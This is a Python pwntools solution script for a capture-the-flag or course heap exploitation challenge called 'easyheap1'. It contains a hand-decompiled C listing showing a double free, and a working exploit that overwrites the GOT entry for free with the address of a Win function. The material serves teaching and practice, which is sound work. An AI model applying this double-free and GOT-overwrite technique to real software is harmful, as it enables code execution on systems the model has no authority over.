#!/usr/bin/python3

from pwn import *

#   Stack content after main is called:
#       MAIN CALLED
#   0 pre main return address                   (8 bytes)
#   1 previous frame pointer                    (8 bytes)
#
#   2 ptr_2                     (rbp - 0x08)    (8 bytes)
#   3 ptr_1                     (rbp - 0x10)    (8 bytes)
#   4 input_3                   (rbp - 0x18)    (8 bytes)
#   5 input_2                   (rbp - 0x20)    (8 bytes)
#   6 input_1                   (rbp - 0x28)    (8 bytes)
#   7 argc                      (rbp - 0x34)    (4 bytes)
#   8 argv                      (rbp - 0x40)    (8 bytes)

# approximation of original c code - decompiled by hand with the help of ghidra decompilation
'''
void Win() {...}

void main(int argc, char *argv[]) {
    unsigned long input1 = strtoul(argv[1], NULL, 16)
    unsigned long input2 = strtoul(argv[2], NULL, 16)
    unsigned long input3 = strtoul(argv[3], NULL, 16)

    unsigned long *ptr_1
    unsigned long *ptr_2

    ptr_1 = malloc(0x10)

    free(ptr_1)
    free(ptr_1)

    ptr_2 = malloc(0x10)

    *ptr_2 = input3

    ptr_2 = malloc(0x10)
    ptr_2 = malloc(0x10)

    *ptr_2 = input2

    free(ptr_2)

    exit(0)
}
'''

def solve():

    # load the elf file
    e = ELF('./easyheap1')

    # find the free entry in the got table
    free = e.got['free']

    # find the address of the win function
    win = e.symbols['Win']

    # arg1 - arbitrary value
    # arg2 - what
    # arg3 - where
    arg1 = 1
    arg2 = win
    arg3 = free

    io = process(['./easyheap1', hex(arg1), hex(arg2), hex(arg3)])
    print(io.recvall().decode("utf-8"))


# DO NOT MODIFY THE CODE BELOW
def main():
    solve()

if __name__ == '__main__':
    main()
